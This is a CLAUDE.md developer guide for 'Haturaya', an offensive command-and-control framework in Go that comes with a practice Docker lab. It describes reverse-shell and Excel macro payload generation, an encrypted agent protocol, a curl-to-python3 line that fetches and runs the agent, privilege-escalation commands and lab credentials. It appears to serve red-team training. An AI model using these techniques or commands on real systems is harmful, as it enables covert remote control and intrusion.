# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Project Overview

Haturaya is a beta-stage Command & Control (C2) framework — "Haturaya" means spirit possession (ผีสิง). Supports Linux targets. Written entirely in Go — single static binary, no runtime dependencies. Features a Bubble Tea TUI, AES-256-GCM encrypted agent communication, and a built-in HTTP payload server.

## Architecture

```
./haturaya-c2 0.0.0.0 9999 9090
        │
        ├── goroutine: TCP listener (:9999)
        │     └── goroutine per agent: handler.go
        │           ├── detect encrypted vs raw mode
        │           ├── register agent
        │           └── relay commands ↔ agent via CmdChan
        │
        ├── goroutine: HTTP payload server (:9090)
        │     ├── GET /              — payload browser (HTML)
        │     ├── GET /payloads/*    — static files
        │     ├── GET /payloads/excel.csv?lhost=&lport=   — DDE CSV
        │     ├── GET /payloads/excel.xls?lhost=&lport=   — MHTML XLS
        │     └── GET /payloads/macro.vba?lhost=&lport=   — VBA macro
        │
        └── Bubble Tea TUI (main goroutine)
              ├── Status bar (host, ports, agent count)
              ├── Agent sidebar (↑/↓ to navigate, Enter to select)
              ├── Output viewport (scrollable)
              └── Command input
```

## Source Layout

```
main.go                        — entry point: parse args, wire everything, run TUI
internal/
  crypto/crypto.go             — AES-256-GCM cipher, SendMsg/RecvMsg (4-byte length-prefix framing)
  agent/agent.go               — Agent struct + thread-safe Registry; Agent.CmdChan chan string
  c2/
    server.go                  — TCP listener goroutine; SetProgram(*tea.Program)
    handler.go                 — per-connection handler; sends tui.* messages to program
  tui/tui.go                   — Bubble Tea model, Update, View; all TUI logic
  payload/
    payload.go                 — Build() returns all reverse shell categories (BASH/SH/PYTHON/PERL/RUBY/PHP/NETCAT/SOCAT/OPENSSL/POWERSHELL/OTHER/EXCEL); WriteAgent() generates agent.py
    excel.go                   — GenerateXLSM() builds .xlsm with XLM macro via archive/zip
  web/server.go                — net/http payload server; dynamic excel/vba endpoints
web_app/
  payloads/                    — static payload files (linpeas.sh, lse.sh, agent.py, payload.xlsm …)
  templates/index.html         — payload browser UI (served by Go, not Flask)
docker/
  Dockerfile.attacker          — multi-stage Go build → alpine:3.19 runtime
  Dockerfile.victim            — Ubuntu 22.04 with intentional misconfigs (5 privesc paths)
  entrypoint-attacker.sh       — runs ./haturaya-c2 directly (no Python)
  entrypoint-victim.sh         — starts cron, apache2, sshd
  vuln.c                       — SUID binary for PATH hijack exercise
docker-compose.yml             — haturaya-lab network (172.20.0.0/24)
lab.sh                         — Docker lab manager helper script
haturaya.sh                    — auto-rebuild wrapper (rebuilds if any .go newer than binary)
```

## Development Workflow

### Build & Run

```bash
# Build binary
go build -o haturaya-c2 .

# Run directly
./haturaya-c2 0.0.0.0 9999 9090

# Or use the auto-rebuild wrapper (rebuilds if source changed)
./haturaya.sh 0.0.0.0 9999 9090
```

### Docker Lab

```bash
bash ./lab.sh start    # build images + start victim container
bash ./lab.sh c2       # run attacker container (interactive TUI)
bash ./lab.sh victim   # root shell in victim
bash ./lab.sh ssh      # SSH as user/password into victim
bash ./lab.sh payloads # show payload one-liners
bash ./lab.sh privesc  # show privesc hints
bash ./lab.sh stop     # tear down
```

## TUI Controls

| Key | Action |
|-----|--------|
| `↑` / `k` | Move cursor up in agent sidebar |
| `↓` / `j` | Move cursor down in agent sidebar |
| `Enter` | Select agent / send command |
| `Esc` | Background agent, return to console |
| `Ctrl+C` | Quit |

## Console Commands (type in input bar)

```
agents                                        list connected agents
use <n>                                       switch to agent n
kill <n>                                      disconnect agent n
generate payloads lhost=X lport=Y shell=Z     show payloads (shell=all for everything)
server status                                 show web server URL
help                                          show help
exit                                          quit
```

### Supported shell types for `generate payloads`
`bash`, `sh`, `python`, `perl`, `ruby`, `php`, `netcat`, `socat`, `openssl`, `powershell`, `other`, `excel`, `all`

### Agent-Level Commands (while inside `use` session)
```
<any shell command>    execute on agent
exit / quit / bg      background agent, return to TUI console
```

## Agent Communication Protocol

### Encrypted Mode (Python AES-GCM agent)
- Framing: `[4-byte big-endian length][payload]`
- Payload: `[12-byte nonce][ciphertext]` (AES-256-GCM)
- Auth handshake on connect:
  - Agent → Server: `[len][enc(HATURAYA_AUTH_v1)]`
  - Server → Agent: `[len][enc(HATURAYA_OK_v1)]`
- All subsequent messages use same framing

### Raw Mode (bash/netcat/socat agents)
- No framing — direct byte relay
- Server detects raw mode when initial bytes are NOT a valid encrypted auth message
- Bidirectional relay: conn→TUI viewport, TUI input→conn

### Generating the Encrypted Python Agent
```
# In TUI console:
generate payloads lhost=172.20.0.2 lport=9999 shell=python
```
This calls `payload.WriteAgent()` which writes `web_app/payloads/agent.py` with the current session key embedded.

```bash
# On victim:
curl http://172.20.0.2:9090/payloads/agent.py | python3
```

## Key Technical Details

### Concurrency Model
- One goroutine per accepted TCP connection (`handler.go`)
- Agent registry protected by `sync.Mutex`
- TUI receives updates via `prog.Send(msg)` — thread-safe Bubble Tea message passing
- Agent's `CmdChan chan string` (buffered, size 8) decouples TUI input from network I/O

### Encryption
- Key generated fresh each run in `main.go` via `crypto.New()`
- AES-256-GCM: 32-byte key, 12-byte random nonce per message
- Key printed as hex at startup (for debugging / manual agent embedding)

### HTTP Payload Server
- Payloads dir resolved relative to binary: `../web_app/payloads/` or `HATURAYA_PAYLOADS_DIR` env var
- Path traversal protection: only serves files directly under payloads dir
- Dynamic endpoints: excel.csv, excel.xls, macro.vba generated on-the-fly from query params

### Excel Payload Generation
- `generate payloads ... shell=excel` calls `payload.WriteXLSM()` → writes `web_app/payloads/payload.xlsm`
- XLSM uses Excel 4.0 (XLM) macros — pure XML, no binary OLE needed
- PowerShell reverse shell embedded as UTF-16LE base64 for `-EncodedCommand`
- Macro sheet is `veryHidden`; `Auto_Open` defined name triggers on workbook open

## Adding New Payload Types

1. Add category to `Build()` in `internal/payload/payload.go`
2. Add category key to `ShellTypes()` slice
3. No other changes needed — TUI and generate command pick it up automatically

## Adding New Static Payloads

Drop any file into `web_app/payloads/` — it appears automatically in the HTTP browser at `/`.

## Victim Docker Container (Lab)

5 built-in privesc paths for practice:

| # | Technique | How |
|---|-----------|-----|
| 1 | Sudo vim escape | `sudo vim -c ':!/bin/bash'` |
| 2 | SUID find | `find . -exec /bin/bash -p \; -quit` |
| 3 | Writable root cron script | append reverse shell to `/opt/scripts/heartbeat.sh` |
| 4 | Readable shadow backup | `cat /var/backups/shadow.bak` → crack with john |
| 5 | SUID binary PATH hijack | `echo '/bin/bash -p' > /tmp/ps && PATH=/tmp:$PATH /usr/local/bin/vuln_app` |

Credentials: `user` / `password`, `root` / `toor` (via SSH on port 2222)
